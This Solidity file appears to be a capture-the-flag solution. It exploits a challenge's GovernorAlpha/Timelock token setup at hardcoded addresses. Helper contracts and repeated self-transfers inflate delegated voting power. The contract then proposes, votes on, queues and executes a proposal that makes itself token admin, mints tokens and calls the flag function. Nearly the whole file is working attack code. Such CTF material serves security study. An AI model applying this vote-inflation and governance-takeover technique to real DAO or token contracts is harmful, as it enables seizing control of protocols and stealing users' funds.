// SPDX-License-Identifier: UNLICENSED

pragma solidity ^0.8.13;
import "Contract.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "forge-std/Test.sol";

contract new_vote
{
    DreamToken vote = new DreamToken();

    constructor(address token_addr)
    {
        vote = DreamToken(token_addr);
    }
    
    function transferFrom(address src, address dst, uint amount) public
    {
        vote.transferFrom(src, dst, amount);
    }
}

contract ex
{
    address public _token;
    address public _timelock;
    address public _gov;
    address public eoa;

    address public alice;
    address public bob;
    Level5 public problem;
    Timelock public timelock;
    GovernorAlpha public gov;
    DreamToken public token;

    uint public blocknumber_check_1;
    uint public blocknumber_check_2;
    uint public blocknumber_check_3;
    uint public blocknumber_check_4;

    address[] _targets;
    uint[] _values;
    string[] _signatures;
    bytes[] _calldatas;
    string _description;
    constructor()
    {
        problem = Level5(address(0x135bA7F14dB39f76e53F463F753472F4a029a6E7));
        (_token, _timelock, _gov) = problem.getAddresses();
        timelock = Timelock(payable(_timelock));
        gov = GovernorAlpha(_gov);
        token = DreamToken(_token);
        eoa = address(0xa267E4f15c979289993a95E22cA9cDf077B708Ba);

        _targets.push(_token);
        _values.push(0);
        _signatures.push('');
        _calldatas.push(abi.encodeWithSignature("setAdmin(address)", address(this)));
    }
    
    function get_flag_1() public payable
    {
        console.log(token.balanceOf(address(this)));
        for(uint256 i=0; i<5; i++)
        {
            console.log(token.balanceOf(address(this)));
            problem.buy{value: 1 ether}();
        }
        console.log(token.balanceOf(address(this)));
        token.delegate(address(this));
        for(uint256 i=0; i<11; i++)
        {
            new_vote new_addr = new new_vote(address(token));
            token.approve(address(new_addr), 5);
            new_addr.transferFrom(address(this), address(this), 5);
        }
    }

    function get_flag_2() public
    {
        require(block.number - blocknumber_check_1 >= 1, 'wait');
        gov.propose(_targets, _values, _signatures, _calldatas, _description);
        blocknumber_check_2 = block.number;
    }

    function get_flag_3() public
    {
        require(block.number - blocknumber_check_2 >= 1, 'wait');
        gov.castVote(1, true);
        blocknumber_check_3 = block.number;
    }

    function get_flag_4() public
    {
        require(block.number - blocknumber_check_3 >= 20, 'wait');
        gov.queue(1);
        blocknumber_check_4 = block.timestamp;
    }

    function get_flag_5() public
    {
        //require(block.timestamp - blocknumber_check_4 >= 5 minutes, 'wait');
        gov.execute(1);
    }

    function get_flag_6() public
    {
        token.mint(eoa, 100000000);
        problem.flag();
    }
}